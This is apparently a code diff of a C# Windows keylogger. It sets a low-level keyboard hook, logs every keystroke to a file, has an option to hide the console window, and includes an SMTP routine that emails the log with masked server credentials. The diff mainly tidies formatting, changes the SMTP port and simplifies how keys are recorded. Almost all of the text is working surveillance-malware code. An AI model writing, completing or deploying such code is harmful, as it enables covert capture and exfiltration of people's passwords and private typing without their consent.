@@ -10,19 +10,21 @@ namespace KeyLogger
 {
 	internal class Program
 	{
-		const int SW_HIDE = 0;
-		const int SW_SHOW = 5;
+		private const int SW_HIDE = 0;
+		private const int SW_SHOW = 5;
 		private const int WH_KEYBOARD_LL = 13;
 		private const int WM_KEYDOWN = 0x0100;
 		private static readonly LowLevelKeyboardProc _proc = HookCallback;
 		private static IntPtr _hookID = IntPtr.Zero;
+		private static StreamWriter _logFile;
 
+		[STAThread]
 		public static void Main()
 		{
 			var hWnd = GetConsoleWindow();
 			// ShowWindow(hWnd, SW_HIDE); // hide console window
 			// SendLog(); // for test
-            _hookID = SetHook(_proc);
+			_hookID = SetHook(_proc);
 			Application.Run();
 			UnhookWindowsHookEx(_hookID);
 		}
@@ -42,24 +44,28 @@ namespace KeyLogger
 		{
 			if (nCode >= 0 && wParam == (IntPtr) WM_KEYDOWN)
 			{
-				var vkCode = Marshal.ReadInt32(lParam);
+				var vkCode = (Keys) Marshal.ReadInt32(lParam);
 
 				using (var writer = new StreamWriter("keyLogger.log", true))
 				{
 					switch (vkCode)
 					{
-						case (int)Keys.Space:
-							writer.WriteAsync(String.Format(" {0} ", ((Keys)vkCode)));
+						case Keys.Space:
+							// writer.WriteAsync(String.Format(" {0} ", ((Keys)vkCode)));
+							writer.WriteAsync(" ");
 							break;
-						case (int)Keys.Return:
-							writer.WriteAsync(String.Format(" {0} ", ((Keys)vkCode)));
+						case Keys.Return:
+							// writer.WriteAsync(String.Format("\n {0} \n", ((Keys)vkCode)));
+							writer.WriteAsync("\n");
 							break;
 						default:
-							writer.WriteAsync(((Keys)vkCode).ToString());
+							writer.WriteAsync(vkCode.ToString());
 							break;
 					}
 				}
+				Console.WriteLine(vkCode);
 			}
+
 			return CallNextHookEx(_hookID, nCode, wParam, lParam);
 		}
 
@@ -79,11 +85,9 @@ namespace KeyLogger
 			{
 				using (var smtpServer = new SmtpClient("***") // smtp server 
 				{
-					Port = 25,
-					Credentials = new NetworkCredential("***", "***"), // user and password
-					EnableSsl = true
-					
-			})
+					Port = 465,
+					Credentials = new NetworkCredential("***", "***") // user and password
+				})
 				{
 					try
 					{
@@ -98,29 +102,31 @@ namespace KeyLogger
 		}
 
 		#region WinApi Functions
+
 		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-			private static extern IntPtr SetWindowsHookEx(int idHook,
-				LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+		private static extern IntPtr SetWindowsHookEx(int idHook,
+			LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
 
-			[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-			[return: MarshalAs(UnmanagedType.Bool)]
-			private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+		[return: MarshalAs(UnmanagedType.Bool)]
+		private static extern bool UnhookWindowsHookEx(IntPtr hhk);
 
-			[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-			private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
-				IntPtr wParam, IntPtr lParam);
+		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+		private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
+			IntPtr wParam, IntPtr lParam);
 
-			[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-			private static extern IntPtr GetModuleHandle(string lpModuleName);
+		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+		private static extern IntPtr GetModuleHandle(string lpModuleName);
 
-			private delegate IntPtr LowLevelKeyboardProc(
-				int nCode, IntPtr wParam, IntPtr lParam);
+		private delegate IntPtr LowLevelKeyboardProc(
+			int nCode, IntPtr wParam, IntPtr lParam);
 
-			[DllImport("kernel32.dll")]
-			static extern IntPtr GetConsoleWindow();
+		[DllImport("kernel32.dll")]
+		private static extern IntPtr GetConsoleWindow();
 
-			[DllImport("user32.dll")]
-			static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+		[DllImport("user32.dll")]
+		private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
 		#endregion
 	}
 }
